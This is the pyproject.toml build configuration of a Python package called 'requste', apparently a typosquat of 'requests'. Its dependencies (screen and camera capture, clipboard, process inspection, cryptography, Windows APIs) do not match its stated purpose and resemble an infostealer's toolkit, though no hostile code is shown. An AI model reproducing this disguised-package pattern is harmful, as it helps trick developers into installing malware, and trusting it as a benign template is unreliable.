[build-system]
requires = ["setuptools>=61.0", "wheel"]
build-backend = "setuptools.build_meta"

[project]
name = "requste"
version = "1.0.0"
description = "Its a python library that can use threading and requests same time"
requires-python = ">=3.9"

dependencies = [
    "requests>=2.28.0",
    "Pillow>=9.0.0",
    "opencv-python>=4.5.0",
    "pyperclip>=1.8.2",
    "psutil>=5.9.0",
    "pycryptodome>=3.15.0",
    "pywin32>=305; sys_platform == 'win32'",
]

[project.scripts]
requste = "requste.main:main"